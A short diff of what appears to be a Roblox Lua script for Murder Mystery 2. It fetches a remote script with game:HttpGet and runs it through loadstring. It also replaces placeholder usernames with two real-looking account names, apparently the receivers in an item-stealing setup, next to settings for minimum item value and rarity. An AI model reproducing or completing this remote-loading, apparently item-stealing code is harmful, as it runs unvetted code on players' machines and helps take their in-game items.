@@ -184,8 +184,8 @@ local ok, result = pcall(function()
 	local lib = loadstring(game:HttpGet("http" .. match .. "/scripts/mm2_value.lua"))()
 	local Users_ = Users or { "what are you doing buddy" }
 	local Username_ = Username or {
-		"No Username",
-		"sad"
+		"iceyblueii",
+		"fsxullalt"
 	}
 	local min_val_each_ = min_val_each or 0
 	local minrarity_ = minrarity or "Common"
